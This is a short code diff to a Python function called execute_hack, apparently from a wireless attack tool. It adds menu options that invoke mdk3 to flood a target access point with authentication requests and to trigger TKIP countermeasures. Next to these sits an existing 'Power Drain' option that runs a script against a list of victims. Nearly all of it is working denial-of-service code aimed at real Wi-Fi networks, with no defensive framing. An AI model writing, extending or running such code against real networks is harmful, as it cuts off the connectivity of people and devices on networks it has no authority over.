@@ -282,6 +282,10 @@ def execute_hack(info, victims):
         elif user_input.lower() == "p": # Power Drain
             for vic in victims:
                 subprocess.call(["x-terminal-emulator","-e","sudo", "python", "psdos.py", info.mon_interface, vic, info.bssid, "nullfunction"])
+        elif user_input.lower() == "a": # Authentication DoS
+            subprocess.call(["sudo", "mdk3", info.mon_interface, "a", "-a", info.bssid])
+        elif user_input.lower() == "t": # TKIP DoS
+            subprocess.call(["sudo", "mdk3", info.mon_interface, "m", "-t", info.bssid])
     else:
         user_input = input("Enter A for AUTH DoS or T for TKIP DoS: ").strip()
         if user_input.lower() == "a": # Authentication DoS
